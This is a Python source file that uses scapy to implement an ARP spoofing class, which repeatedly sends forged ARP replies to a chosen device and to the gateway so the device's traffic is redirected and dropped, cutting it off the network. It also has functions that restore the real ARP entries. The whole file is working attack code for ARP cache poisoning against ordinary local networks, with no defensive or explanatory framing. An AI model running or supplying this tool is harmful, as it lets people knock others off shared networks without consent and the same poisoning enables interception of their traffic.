import threading
import time
from scapy.all import ARP, send


class ARPSpoofer:
    """
    Blocks a device by continuously sending forged ARP replies:
      - To the target:  "The gateway's IP is at MY MAC"
      - To the gateway: "The target's IP is at MY MAC"
    Since we don't forward the packets, the target loses internet.
    Unblocking restores the real ARP entries on both sides.
    """

    def __init__(self):
        self._active: dict[str, bool] = {}   # target_ip -> running flag
        self._lock = threading.Lock()

    def block(self, target_ip: str, target_mac: str,
              gateway_ip: str, gateway_mac: str) -> None:
        with self._lock:
            if self._active.get(target_ip):
                return
            self._active[target_ip] = True

        t = threading.Thread(
            target=self._loop,
            args=(target_ip, target_mac, gateway_ip, gateway_mac),
            daemon=True,
        )
        t.start()

    def unblock(self, target_ip: str, target_mac: str,
                gateway_ip: str, gateway_mac: str) -> None:
        with self._lock:
            self._active[target_ip] = False
        self._restore(target_ip, target_mac, gateway_ip, gateway_mac)

    def unblock_all(self, devices: list[dict],
                    gateway_ip: str, gateway_mac: str) -> None:
        with self._lock:
            blocked = [ip for ip, running in self._active.items() if running]
            for ip in blocked:
                self._active[ip] = False

        for dev in devices:
            if dev["ip"] in blocked:
                self._restore(dev["ip"], dev["mac"], gateway_ip, gateway_mac)

    def is_blocked(self, target_ip: str) -> bool:
        return self._active.get(target_ip, False)

    # ── internals ─────────────────────────────────────────────────────────────

    def _loop(self, target_ip: str, target_mac: str,
              gateway_ip: str, gateway_mac: str) -> None:
        while self._active.get(target_ip):
            # Poison target — "I am the gateway"
            send(ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip), verbose=0)
            # Poison gateway — "I am the target"
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),  verbose=0)
            time.sleep(1.5)

    def _restore(self, target_ip: str, target_mac: str,
                 gateway_ip: str, gateway_mac: str) -> None:
        send(ARP(op=2, pdst=target_ip,  hwdst=target_mac,
                 psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=0)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                 psrc=target_ip,  hwsrc=target_mac),  count=5, verbose=0)
